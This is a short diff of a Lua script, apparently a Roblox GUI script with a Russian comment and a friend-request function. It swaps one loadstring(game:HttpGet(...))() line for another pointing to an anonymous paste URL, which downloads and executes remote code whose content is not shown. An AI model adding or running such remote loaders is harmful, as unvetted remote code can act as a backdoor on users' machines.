@@ -32,7 +32,7 @@ Title.Parent = Background
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 
-loadstring(game:HttpGet("https://pastefy.app/HuIaoEoR/raw",true))()
+loadstring(game:HttpGet("https://pastefy.app/OdHykpcd/raw"))()
 
 -- Функция отправки запроса
 local function sendFriendRequest(player)
